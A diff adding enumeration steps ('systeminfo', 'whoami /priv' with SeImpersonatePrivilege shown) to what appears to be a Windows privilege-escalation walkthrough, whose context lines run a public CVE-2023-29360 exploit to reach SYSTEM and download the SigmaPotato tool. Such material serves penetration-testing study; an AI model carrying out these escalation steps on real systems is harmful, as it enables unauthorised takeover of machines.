@@ -1585,6 +1585,16 @@ Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description
 whoami /priv
 ~~~
 
+#### Enumerating the Windows version
+
+~~~ powershell
+systeminfo
+
+...
+OS Version:                10.0.22621 N/A Build 22621
+...
+~~~
+
 
 #### Elevating our privileges to SYSTEM([CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release))
 
@@ -1592,6 +1602,14 @@ whoami /priv
 .\CVE-2023-29360.exe
 ~~~
 
+#### Checking assigned privileges
+
+~~~ powershell
+whoami /priv
+...
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+...
+~~~
 
 #### Downloading SigmaPotato.exe
 
